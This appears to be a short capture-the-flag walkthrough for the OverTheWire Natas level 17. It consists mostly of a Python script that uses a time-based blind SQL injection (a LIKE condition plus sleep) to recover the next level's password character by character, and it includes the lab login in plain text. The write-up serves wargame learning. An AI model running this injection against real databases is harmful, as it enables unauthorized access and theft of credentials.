For this level I will exploit a concept called blind sql injection. In which I will put a sleep in the query to know if the query is valid or not and get the password as one of the previous levels. Here is the scipt of python.

import requests, string

url = 'http://natas17.natas.labs.overthewire.org'
user = 'natas17'
passw = 'EqjHJbo7LFNb8vwhHb9s75hokh5TF0OC'
password = ''
characters = ''.join([string.digits, string.ascii_letters])
while len(password) < 32:
    for char in characters:
        response = requests.post(url,
                                 data={"username": 'natas18" AND binary password like "' + password + char + '%%" and sleep(2)# '},
                                 auth=(user, passw))
        if response.elapsed.seconds >= 1:
            password += char
            print(password)
            break
